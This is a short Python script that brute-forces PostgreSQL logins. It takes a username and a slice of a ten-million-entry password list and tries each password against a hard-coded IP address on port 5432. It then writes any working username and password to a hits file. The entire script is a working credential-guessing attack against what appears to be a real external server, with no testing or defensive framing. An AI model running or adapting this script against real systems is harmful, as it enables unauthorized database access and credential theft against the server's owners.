import psycopg2,sys,time
user=sys.argv[1]; start=int(sys.argv[2]); count=int(sys.argv[3])
pw=[l.rstrip('\n') for l in open('pw10m.txt')][start:start+count]
for p in pw:
    try:
        c=psycopg2.connect(host='141.8.192.100',port=5432,user=user,password=p,connect_timeout=6,dbname='postgres')
        print(f'PGHIT {user}:{p}',flush=True); open('HIT_PG.txt','w').write(user+':'+p+'\n'); sys.exit(0)
    except psycopg2.OperationalError as e:
        if 'password authentication failed' in str(e) or 'no password supplied' in str(e): continue
        time.sleep(0.3)
    except Exception: time.sleep(0.3)
print('PGDONE',start,flush=True)
